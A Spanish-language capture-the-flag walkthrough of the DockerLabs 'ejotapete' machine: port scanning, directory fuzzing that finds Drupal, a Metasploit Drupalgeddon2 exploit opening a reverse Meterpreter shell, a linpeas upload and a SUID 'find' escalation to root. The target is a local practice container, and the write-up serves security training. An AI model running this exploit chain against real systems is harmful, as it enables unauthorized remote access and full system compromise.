---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `Drupal` `Drupalgeddon2` `Metasploit` `RCE` `Gobuster` `Linpeas` `SUID`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip ejotapete.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh ejotapete.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 21:21 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

Solo el puerto `80` está abierto, y al acceder nos encontramos con un `403 Forbidden`.

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

## GOBUSTER

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/drupal               (Status: 301) [Size: 309] [--> http://172.17.0.2/drupal/]
Progress: 155619 / 1543906 (10.08%)
```

Encontramos un directorio `/drupal`, lo que indica que podría tratarse de un CMS.

Si navegamos dentro del directorio, confirmamos que efectivamente se trata de un `CMS Drupal`. Este tiene múltiples vulnerabilidades conocidas, así que utilizamos `Metasploit` para intentar explotar alguna de ellas.

## METASPLOIT

```bash
msfconsole
```

```js
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS 172.17.0.2
set TARGETURI /drupal
run
```

Info:

```
[*] Started reverse TCP handler on 10.0.4.12:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (10.0.4.12:4444 -> 172.17.0.2:53510) at 2025-09-11 21:31:31 +0200

meterpreter > getuid
Server username: www-data

```

Obtenemos una sesión meterpreter con el usuario `www-data`.

## ESCALADA DE PRIVILEGIOS

Para escalar privilegios, transferimos el script `linpeas.sh` desde nuestra máquina atacante al directorio `/tmp` de la víctima.

```js
cd tmp
upload /home/trihack/Downloads/linpeas.sh
```

Info:

```
[*] Uploading  : /home/trihack/Downloads/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 932.07 KiB (0.0%): /home/trihack/Downloads/linpeas.sh -> linpeas.sh
[*] Completed  : /home/trihack/Downloads/linpeas.sh -> linpeas.sh
```

A continuación lo ejecutamos desde una shell de `bash`.

```js
shell
/bin/bash -i
chmod +x linpeas.sh
./linpeas.sh
```

Info:

En los binarios con permisos `SUID`, identificamos que podemos ejecutar el binario `find` con privilegios de `root`.

Aprovechamos esto para obtener una `shell` de `root` de la siguiente manera:

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

Info:

```
bash-4.4# whoami
root
bash-4.4# 
```

Ya somos root!
